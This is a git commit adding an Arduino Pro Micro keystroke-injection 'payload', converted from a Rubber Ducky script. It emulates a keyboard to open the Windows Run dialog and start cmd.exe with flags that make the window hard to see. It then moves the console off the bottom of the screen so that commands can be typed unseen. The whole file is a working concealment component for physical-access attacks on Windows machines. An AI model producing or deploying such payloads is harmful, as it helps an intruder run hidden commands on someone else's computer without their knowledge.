fad680bf5294f20fdfb317b4aa638473f37e7ca6
TheFrenchGuy <30523707+TheFrenchGuy@users.noreply.github.com>
2017-08-01 08:17:59 +0100

    Payload hide cmd window
    The following is an example of how to hide the command window below the bottom of the screen while typing in commands. The window movement part of the script can also be used on any other window. CMD.exe is also run with some command line flags for changing the appearance of the window to make it harder to view, and also a flag that turns on delayed expansion in the command prompt which allows for variable names to be called more than once in a line with no adverse effects. Ex…​ SET Something = Something + Something_Else

---
+++ Payload_hide_cmd_window_ArduinoProMicro/Payload_hide_cmd_window_ArduinoProMicro.ino
@@ -0,0 +1,59 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  // Target: WINDOWS VISTA/7
+  // Encoder V2.4
+  // Using the run command for a broader OS base.
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+
+  Keyboard.print("M");
+
+  for(int i = 0; i < 100; i++) {
+    typeKey(KEY_DOWN_ARROW);
+  }
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
